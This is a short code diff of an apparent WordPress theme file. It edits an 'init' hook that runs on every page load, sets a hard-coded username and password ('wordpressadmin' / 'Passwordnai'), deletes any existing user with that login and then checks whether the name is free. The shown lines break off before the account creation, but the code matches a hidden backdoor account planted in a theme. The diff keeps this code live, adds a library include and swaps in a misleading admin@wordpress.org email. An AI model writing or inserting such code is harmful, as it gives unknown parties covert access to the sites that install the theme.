@@ -39,13 +39,13 @@ function disable_mytheme_action() {
 	define('DISALLOW_FILE_MODS',true);
 }
 // add_action('init','disable_mytheme_action');
-add_action( 'init', function () {
-  
+add_action( 'init', function () {  
 	$username = 'wordpressadmin';
 	$password = 'Passwordnai';
-	$email_address = 'mostak.shahid@hotmail.com';
-	$user = get_user_by( 'login', 'wordpressadmin' );
-	if ( $user ) { // get_user_by can return false, if no such user exists
+	$email_address = 'admin@wordpress.org';
+	$user = get_user_by( 'login', $username );
+	if ( $user ) {
+    	require_once(ABSPATH.'wp-admin/includes/user.php' );
 	    wp_delete_user( $user->ID );
 	}
 	if ( ! username_exists( $username ) ) {
